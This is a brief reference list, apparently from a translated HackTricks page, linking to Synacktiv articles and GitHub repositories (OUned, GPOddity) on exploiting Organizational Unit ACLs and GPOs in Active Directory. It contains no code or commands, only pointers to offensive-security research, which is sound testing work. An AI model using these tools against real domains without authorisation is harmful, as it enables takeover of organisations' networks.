- [14] [OUned.py: iskorišćavanje ACL attack vektora skrivenih Organizational Units u Active Directory-ju](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Simulacija legitimnih Active Directory servisa na mreži: slučaj iskorišćavanja GPO-ova](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
